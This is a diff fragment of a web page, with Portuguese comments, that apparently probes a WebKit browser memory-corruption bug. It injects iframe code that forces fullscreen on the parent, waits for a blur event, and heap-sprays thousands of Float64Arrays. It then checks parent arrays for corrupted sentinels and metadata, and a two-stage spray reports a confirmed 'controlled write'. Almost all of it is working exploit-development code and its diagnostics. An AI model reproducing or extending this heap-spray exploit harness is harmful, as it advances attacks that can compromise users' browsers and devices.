+    'if(elem.webkitRequestFullscreen){ elem.webkitRequestFullscreen(); }' +
+    'ilog("[T2] Fullscreen ativo. Aguardando OPTIONS...");' +
+    'P.window.onblur = function(){' +
+    '    P.window.onblur = null;' +
+    '    ilog("[T2] onblur recebido.");' +
+    '    var arrays = P.parentArrays[2];' +
+    '    var spray=[];' +
+    '    for(var i=0;i<8000;i++){var p=new Float64Array(10);p.fill(SPRAY_PATTERN);spray.push(p);}' +
+    '    var rep = [];' +
+    '    for(var i=0;i<arrays.length;i++){' +
+    '        var a=arrays[i].ref;' +
+    '        try{' +
+    '            rep.push(arrays[i].label+": [0]="+a[0]+" hex="+hexOf(a[0])+" byteLength="+a.byteLength);' +
+    '        }catch(e){rep.push(arrays[i].label+": EXCECAO="+e);}' +
+    '    }' +
+    '    spray=null;' +
+    '    killSelf(rep);' +
+    '};'
+    : '') +
+
+    (testId === 3 ?
+    // T3: sentinelas unicos — fullscreen → blur → spray → verifica 5000 → kill
+    'ilog("[T3] Ativando fullscreen no parent...");' +
+    'var elem = P.document.documentElement;' +
+    'if(elem.webkitRequestFullscreen){ elem.webkitRequestFullscreen(); }' +
+    'ilog("[T3] Fullscreen ativo. Aguardando OPTIONS...");' +
+    'P.window.onblur = function(){' +
+    '    P.window.onblur = null;' +
+    '    ilog("[T3] onblur recebido. Spray com SPRAY_PATTERN...");' +
+    '    var all = P.parentArrays[3]._all;' +
+    '    var spray=[];' +
+    '    for(var i=0;i<8000;i++){var p=new Float64Array(10);p.fill(SPRAY_PATTERN);spray.push(p);}' +
+    '    var hits=[];' +
+    '    for(var i=0;i<all.length;i++){' +
+    '        var c=all[i];' +
+    '        if(c[0]!==SENTINEL_A||c[2]!==SENTINEL_B){' +
+    '            var sp=(c[0]===SPRAY_PATTERN||c[1]===SPRAY_PATTERN||c[2]===SPRAY_PATTERN);' +
+    '            hits.push("controller["+i+"]: [0]="+c[0]+" [2]="+c[2]+" spray_pattern="+sp);' +
+    '            if(hits.length>=5) break;' +
+    '        }' +
+    '    }' +
+    '    var rep = hits.length>0 ? hits : ["Sem corrupcao detectada pre-kill"];' +
+    '    spray=null;' +
+    '    killSelf(rep);' +
+    '};'
+    : '') +
+
+    (testId === 4 ?
+    // T4: metadados — fullscreen → blur → spray → verifica byteLength → kill
+    'ilog("[T4] Ativando fullscreen no parent...");' +
+    'var elem = P.document.documentElement;' +
+    'if(elem.webkitRequestFullscreen){ elem.webkitRequestFullscreen(); }' +
+    'ilog("[T4] Fullscreen ativo. Aguardando OPTIONS...");' +
+    'P.window.onblur = function(){' +
+    '    P.window.onblur = null;' +
+    '    ilog("[T4] onblur recebido. Spray...");' +
+    '    var all = P.parentArrays[4]._all;' +
+    '    var spray=[];' +
+    '    for(var i=0;i<8000;i++){var p=new Float64Array(10);p.fill(SPRAY_PATTERN);spray.push(p);}' +
+    '    var rep=[];' +
+    '    var metaBad=0;' +
+    '    for(var i=0;i<all.length;i++){' +
+    '        var c=all[i];' +
+    '        if(c.byteLength!==64||c.length!==8){' +
+    '            metaBad++;' +
+    '            rep.push("META CORROMPIDO controller["+i+"]: byteLength="+c.byteLength+" length="+c.length);' +
+    '            if(metaBad>=5) break;' +
+    '        }' +
+    '    }' +
+    '    if(metaBad===0) rep.push("Metadados intactos em todos os objetos pre-kill.");' +
+    '    spray=null;' +
+    '    killSelf(rep);' +
+    '};'
+    : '') +
+
+    (testId === 5 ?
+    // T5: dois estagios — fullscreen → blur → sprayA → libera → sprayB → verifica → kill
+    'ilog("[T5] Ativando fullscreen no parent...");' +
+    'var elem = P.document.documentElement;' +
+    'if(elem.webkitRequestFullscreen){ elem.webkitRequestFullscreen(); }' +
+    'ilog("[T5] Fullscreen ativo. Aguardando OPTIONS...");' +
+    'P.window.onblur = function(){' +
+    '    P.window.onblur = null;' +
+    '    ilog("[T5] onblur recebido. Spray A...");' +
+    '    var all = P.parentArrays[5]._all;' +
+    '    var spray1=[];' +
+    '    for(var i=0;i<4000;i++){var p=new Float64Array(10);p.fill(SPRAY_A);spray1.push(p);}' +
+    '    var hitA=-1;' +
+    '    for(var i=0;i<all.length;i++){if(all[i][0]===SPRAY_A||all[i][2]===SPRAY_A){hitA=i;break;}}' +
+    '    ilog("[T5] Stage A hit: controller["+hitA+"]");' +
+    '    spray1=null;' +
+    '    ilog("[T5] Spray A liberado. Spray B...");' +
+    '    var spray2=[];' +
+    '    for(var i=0;i<4000;i++){var p=new Float64Array(10);p.fill(SPRAY_B);spray2.push(p);}' +
+    '    var hitB=-1;' +
+    '    for(var i=0;i<all.length;i++){if(all[i][0]===SPRAY_B||all[i][2]===SPRAY_B){hitB=i;break;}}' +
+    '    ilog("[T5] Stage B hit: controller["+hitB+"]");' +
+    '    var rep=[];' +
+    '    rep.push("Stage A hit: controller["+hitA+"]");' +
+    '    rep.push("Stage B hit: controller["+hitB+"]");' +
+    '    if(hitA!==-1&&hitB!==-1){' +
+    '        rep.push("ESCRITA CONTROLADA — dois estagios confirmados. Mesmo obj: "+(hitA===hitB?"SIM":"NAO idx="+hitA+"/"+hitB));' +
+    '    } else {' +
+    '        rep.push("Hit parcial ou nenhum — A="+hitA+" B="+hitB);' +
+    '    }' +
+    '    spray2=null;' +
+    '    killSelf(rep);' +
+    '};'
+    : '') +
+
+    '<\/script></body></html>';
+
+    // Escreve o codigo no iframe de forma assíncrona para evitar erro null
+    setTimeout(function() {
+        var doc = fr.contentDocument || fr.contentWindow.document;
+        if (doc) {
+            doc.open();
+            doc.write(iframeCode);
+            doc.close();
+        } else {
+            log(id, '[ERRO] Não foi possível acessar o contentDocument do iframe.');
+        }
+    }, 10);
 }
 
 </script>
-
 </body>
 </html>
